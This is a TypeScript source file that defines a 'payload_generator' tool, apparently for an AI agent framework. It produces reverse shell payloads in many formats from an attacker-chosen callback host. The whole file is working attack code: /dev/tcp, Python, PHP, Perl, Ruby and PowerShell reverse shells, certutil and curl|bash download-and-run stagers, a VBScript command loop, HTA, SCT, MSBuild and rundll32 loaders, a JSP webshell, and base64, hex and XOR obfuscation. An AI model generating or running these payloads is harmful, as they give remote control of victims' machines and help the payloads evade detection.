import { Tool } from "./tool"
import z from "zod"

const DESCRIPTION =
  "Generate polyglot reverse shell payloads in 15+ formats with encoding, obfuscation, and staging options."

const PARAMETERS = z.object({
  lhost: z.string().describe("Callback IP / hostname"),
  lport: z.number().int().min(1).max(65535).describe("Callback port"),
  format: z
    .enum([
      "bash",
      "python",
      "php",
      "perl",
      "ruby",
      "lua",
      "go",
      "powershell",
      "cmd",
      "vbs",
      "mshta",
      "sct",
      "jsp",
      "war",
      "csharp",
      "msbuild",
      "dll",
      "exe",
      "all",
    ])
    .optional()
    .describe("Payload format (default: all)"),
  encoding: z.enum(["none", "base64", "hex", "url", "rot13", "xor"]).optional().describe("Output encoding/obfuscation"),
  method: z
    .enum(["shell", "download", "dns", "icmp", "websocket"])
    .optional()
    .describe("Connection method (shell = TCP reverse shell)"),
  sleep: z.number().int().min(0).optional().describe("Sleep between reconnect attempts (seconds)"),
  retry: z.boolean().optional().describe("Auto-retry on connection failure"),
  os: z.enum(["linux", "windows", "macos", "all"]).optional().describe("Target operating system"),
  useragent: z.string().optional().describe("Custom User-Agent for HTTP-based payloads"),
  inline: z.boolean().optional().describe("Generate inline one-liners vs full scripts"),
})

const SHELLCODE_X86_REV_TCP = (host: string, port: number): string => {
  // Placeholder — actual shellcode would be generated via msfvenom
  return `\\xfc\\xe8\\x82... (generate via: msfvenom -p linux/x86/shell_reverse_tcp LHOST=${host} LPORT=${port} -f c)`
}

function b64(s: string): string {
  return Buffer.from(s).toString("base64")
}

function rot13(s: string): string {
  return s.replace(/[a-zA-Z]/g, (c) =>
    String.fromCharCode(
      (c <= "Z" ? 90 : 122) >= (c = String.fromCharCode(c.charCodeAt(0) + 13)).charCodeAt(0)
        ? c.charCodeAt(0)
        : c.charCodeAt(0) - 26,
    ),
  )
}

function xorEncode(s: string, key: number): string {
  return Buffer.from(
    s
      .split("")
      .map((c) => String.fromCharCode(c.charCodeAt(0) ^ key))
      .join(""),
  ).toString("base64")
}

function applyEncoding(cmd: string, enc: string | undefined): string {
  if (!enc || enc === "none") return cmd
  if (enc === "base64") return `echo ${b64(cmd)} | base64 -d | bash`
  if (enc === "hex") return `echo ${Buffer.from(cmd).toString("hex")} | xxd -r -p | bash`
  if (enc === "url") return encodeURIComponent(cmd)
  if (enc === "rot13") return rot13(cmd)
  if (enc === "xor")
    return `echo ${xorEncode(cmd, 0x55)} | python3 -c "import sys,base64;exec(__import__('codecs').decode(base64.b64decode(sys.stdin.read()),'rot13'))"`
  return cmd
}

function psEnc(s: string): string {
  const enc = Buffer.from(s, "utf16le").toString("base64")
  return `powershell -nop -w hidden -enc ${enc}`
}

function bashOne(host: string, port: number): string[] {
  return [
    `sh -i >& /dev/tcp/${host}/${port} 0>&1`,
    `bash -i >& /dev/tcp/${host}/${port} 0>&1`,
    `exec 5<>/dev/tcp/${host}/${port};cat <&5|while read l;do $l 2>&5>&5;done`,
    `0<&196;exec 196<>/dev/tcp/${host}/${port};sh <&196>&196 2>&196`,
  ]
}

function pythonOne(host: string, port: number): string[] {
  return [
    `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${host}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${host}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'`,
    `python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.settimeout(5);s1.connect(("${host}",${port}));s1.send(b"HELLO");sp.call(["/bin/sh","-i"],stdin=s1,stdout=s1,stderr=s1)""")'`,
  ]
}

function phpOne(host: string, port: number): string[] {
  return [
    `php -r '$s=fsockopen("${host}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    `php -r '$s=fsockopen("${host}",${port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`,
    `php -r '$s=fsockopen("${host}",${port});$d=array(0=>$s,1=>$s,2=>$s);$p=proc_open("/bin/sh",$d,$p);'`,
    `php -r 'eval(base64_decode("${b64('$s=fsockopen("' + host + '",' + port + ');exec("/bin/sh -i <&3 >&3 2>&3");')}"));'`,
  ]
}

function perlOne(host: string, port: number): string[] {
  return [
    `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
    `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"${host}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'`,
    `perl -e 'use Socket;my($i,$p)=("${host}",${port});socket(S,PF_INET,SOCK_STREAM,6);connect(S,pack_sockaddr_in($p,inet_aton($i)));exec("/bin/sh -i <&".fileno(S)." >&".fileno(S)." 2>&".fileno(S));'`,
  ]
}

function rubyOne(host: string, port: number): string[] {
  return [
    `ruby -rsocket -e 'f=TCPSocket.open("${host}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    `ruby -rsocket -e 'c=TCPSocket.new("${host}",${port});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
    `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${host}",${port});loop{c.gets.chomp!;(cmd) ? (IO.popen(cmd,"r"){|io|c.print io.read}) : nil} rescue nil'`,
  ]
}

function luaOne(host: string, port: number): string[] {
  return [
    `lua5.1 -e 'local s=require("socket");local t=assert(s.tcp());t:connect("${host}",${port});while true do local r,x=t:receive();local f=assert(io.popen(r,"r"));local b=assert(f:read("*a"));t:send(b);end;f:close();t:close();'`,
  ]
}

function goPayload(host: string, port: number): string[] {
  return [
    `echo 'package main;import"net";import"os/exec";func main(){c,_:=net.Dial("tcp","${host}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/s.go && go run /tmp/s.go`,
    `// Go reverse shell — compile then run
package main
import ("net";"os/exec")
func main() {
    c,_ := net.Dial("tcp","${host}:${port}")
    cmd := exec.Command("/bin/bash")
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}`,
  ]
}

function psPayload(host: string, port: number, sleep?: number, retry?: boolean, ua?: string): string[] {
  const retryLogic = retry ? `\nwhile($true){try{` : ""
  const retryClose = retry ? `}catch{Start-Sleep -s ${sleep || 5}}}` : ""

  const ps1 = `${retryLogic}$c=New-Object System.Net.Sockets.TCPClient('${host}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()${retryClose}`

  const ps2 = `${retryLogic}$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("${b64(ps1)}"));IEX (New-Object IO.StreamReader($s)).ReadToEnd()${retryClose}`

  const ps3 = `${retryLogic}$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','${ua || "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}');IEX $w.DownloadString('http://${host}:8080/rev.ps1')${retryClose}`

  const psDownload = `powershell IEX (New-Object Net.WebClient).DownloadString('http://${host}:8080/rev.ps1')`

  return [ps1, psEnc(ps1), ps2, ps3, psDownload]
}

function cmdPayload(host: string, port: number): string[] {
  return [
    `cmd.exe /c powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('${host}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=iex $d 2>&1|Out-String;$sb2=$sb+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"`,
    `cmd.exe /c "certutil -urlcache -split -f http://${host}:8080/rev.exe C:\\Windows\\Temp\\s.exe && C:\\Windows\\Temp\\s.exe"`,
  ]
}

function vbsPayload(host: string, port: number): string {
  return `' Save as rev.vbs, run: cscript rev.vbs
Set shell = CreateObject("WScript.Shell")
Set client = CreateObject("MSXML2.ServerXMLHTTP")
Set stream = CreateObject("ADODB.Stream")
Do
  client.open "GET", "http://${host}:8080/cmd", False
  client.send
  cmd = client.responseText
  If cmd <> "" Then
    Set exec = shell.Exec("cmd.exe /c " & cmd)
    output = exec.StdOut.ReadAll & exec.StdErr.ReadAll
    client.open "POST", "http://${host}:8080/out", False
    client.setRequestHeader "Content-Type", "text/plain"
    client.send output
  End If
  WScript.Sleep 3000
Loop`
}

function mshtaPayload(host: string, port: number): string {
  const ps = psPayload(host, port)[0]
  const hta = `<html>
<head><HTA:APPLICATION id="x" windowState="minimize" showInTaskbar="no"/></head>
<body>
<script language="VBScript">
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell -nop -w hidden -enc ${b64(ps)}", 0, False
window.close()
</script>
</body></html>`
  return hta
}

function jspPayload(host: string, port: number): string {
  return `<%@ page import="java.io.*,java.net.*" %>
<%
  String host = "${host}";
  int port = ${port};
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    InputStream in = p.getInputStream();
    int b;
    while ((b = in.read()) != -1) out.write(b);
  }
%>`
}

function csharpPayload(host: string, port: number): string {
  return `using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;

class Rev {
    static void Main() {
        using(var c = new TcpClient("${host}", ${port}))
        using(var s = c.GetStream())
        using(var r = new StreamReader(s))
        using(var w = new StreamWriter(s)) {
            var p = new Process{
                StartInfo = new ProcessStartInfo{
                    FileName = "/bin/bash",
                    Arguments = "-i",
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false
                }
            };
            p.Start();
            w.AutoFlush = true;
            p.StandardInput.AutoFlush = true;
            new Thread(() => { while(true) p.StandardOutput.BaseStream.CopyTo(s); }).Start();
            new Thread(() => { while(true) p.StandardError.BaseStream.CopyTo(s); }).Start();
            new Thread(() => { while(true) s.CopyTo(p.StandardInput.BaseStream); }).Start();
            p.WaitForExit();
        }
    }
}`
}

function msbuildPayload(host: string, port: number): string {
  const ps = psEnc(psPayload(host, port)[0])
  return `<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Rev">
    <Exec Command="${ps}" />
  </Target>
</Project>`
}

function dllPayload(host: string, port: number): string {
  return `// Compile: csc /target:library /out:rev.dll rev.cs
// Run: rundll32.exe rev.dll,Entry
using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

public class Rev {
    [DllExport]
    public static void Entry(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow) {
        using(var c = new TcpClient("${host}", ${port}))
        using(var s = c.GetStream())
        using(var r = new StreamReader(s))
        using(var w = new StreamWriter(s)) {
            var p = new Process {
                StartInfo = new ProcessStartInfo {
                    FileName = "cmd.exe",
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false
                }
            };
            p.Start();
            w.AutoFlush = true;
            new Thread(() => { int ch; while((ch=s.ReadByte())!=-1) p.StandardInput.Write((char)ch); }).Start();
            new Thread(() => { int ch; while((ch=p.StandardOutput.Read())!=-1) s.WriteByte((byte)ch); }).Start();
            new Thread(() => { int ch; while((ch=p.StandardError.Read())!=-1) s.WriteByte((byte)ch); }).Start();
            p.WaitForExit();
        }
    }
}`
}

function sctPayload(host: string, port: number): string {
  const ps = psPayload(host, port)[0]
  return `<?XML version="1.0"?>
<scriptlet>
<registration progid="PoC" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -enc ${b64(ps)}", 0, false);
]]>
</script>
</registration>
</scriptlet>`
}

export const PayloadGeneratorTool = Tool.define("payload_generator", async () => ({
  description: DESCRIPTION,
  parameters: PARAMETERS,
  async execute(params, ctx): Promise<{ title: string; output: string; metadata: Record<string, any> }> {
    const { lhost, lport } = params
    const format = params.format || "all"
    const encoding = params.encoding || "none"
    const method = params.method || "shell"
    const sleep = params.sleep || 5
    const retry = params.retry ?? false
    const targetOS = params.os || "all"
    const ua = params.useragent
    const inline = params.inline ?? true

    const gen: Record<string, string | string[]> = {}

    if (format === "all" || format === "bash") {
      if (targetOS === "all" || targetOS === "linux") {
        gen["Bash (/dev/tcp)"] = bashOne(lhost, lport)
      }
    }

    if (format === "all" || format === "python") {
      if (targetOS === "all" || targetOS === "linux") {
        gen["Python"] = pythonOne(lhost, lport)
      }
    }

    if (format === "all" || format === "php") {
      gen["PHP"] = phpOne(lhost, lport)
    }

    if (format === "all" || format === "perl") {
      gen["Perl"] = perlOne(lhost, lport)
    }

    if (format === "all" || format === "ruby") {
      gen["Ruby"] = rubyOne(lhost, lport)
    }

    if (format === "all" || format === "lua") {
      gen["Lua"] = luaOne(lhost, lport)
    }

    if (format === "all" || format === "go") {
      gen["Golang"] = goPayload(lhost, lport)
    }

    if (format === "all" || format === "powershell") {
      gen["PowerShell"] = psPayload(lhost, lport, sleep, retry, ua)
    }

    if (format === "all" || format === "cmd") {
      gen["CMD (.bat)"] = cmdPayload(lhost, lport)
    }

    if (format === "all" || format === "vbs") {
      gen["VBScript"] = [vbsPayload(lhost, lport)]
    }

    if (format === "all" || format === "mshta") {
      gen["MSHTA (.hta)"] = [mshtaPayload(lhost, lport)]
    }

    if (format === "all" || format === "sct") {
      gen["SCT (regsvr32)"] = [sctPayload(lhost, lport)]
    }

    if (format === "all" || format === "msbuild") {
      gen["MSBuild (.xml)"] = [msbuildPayload(lhost, lport)]
    }

    if (format === "all" || format === "dll") {
      gen["DLL (rundll32)"] = [dllPayload(lhost, lport)]
    }

    if (format === "all" || format === "csharp") {
      gen["C# (.exe)"] = [csharpPayload(lhost, lport)]
    }

    if (format === "all" || format === "jsp") {
      gen["JSP Webshell"] = [jspPayload(lhost, lport)]
    }

    if (method === "download" && (format === "all" || format === "powershell")) {
      gen["PowerShell Stager"] = [
        `powershell IEX (New-Object Net.WebClient).DownloadString('http://${lhost}:8080/rev.ps1')`,
        `powershell (New-Object Net.WebClient).DownloadFile('http://${lhost}:8080/rev.exe','C:\\Windows\\Temp\\s.exe');C:\\Windows\\Temp\\s.exe`,
      ]
    }

    if (method === "download" && (format === "all" || format === "bash")) {
      gen["Bash Stager"] = [`curl http://${lhost}:8080/rev.sh | bash`, `wget -qO- http://${lhost}:8080/rev.sh | bash`]
    }

    const formatCount = Object.keys(gen).length
    const payloadCount = Object.values(gen).flat().length

    let output = `## Payload Generator\n\n**Listener**: ${lhost}:${lport}\n**Format**: ${format}\n**Encoding**: ${encoding}\n**OS**: ${targetOS}\n**Method**: ${method}\n**Retry**: ${retry ? `yes (sleep ${sleep}s)` : "no"}\n**Payloads generated**: ${payloadCount} in ${formatCount} format(s)\n\n`

    if (!inline) {
      output += `### Listener Setup\n\n\`\`\`bash\nnc -lvnp ${lport}\n\`\`\`\n\n`
    }

    for (const [name, payloads] of Object.entries(gen)) {
      output += `### ${name}\n\n`
      const items = Array.isArray(payloads) ? payloads : [payloads]
      for (const p of items) {
        const encoded = applyEncoding(p, encoding)
        output += `\`\`\`\n${encoded}\n\`\`\`\n\n`
      }
    }

    return {
      title: `Payload Generator: ${formatCount} formats`,
      output,
      metadata: {
        action: "payload_generator",
        lhost,
        lport,
        formats: formatCount,
        payloads: payloadCount,
        encoding,
        method,
      },
    }
  },
}))
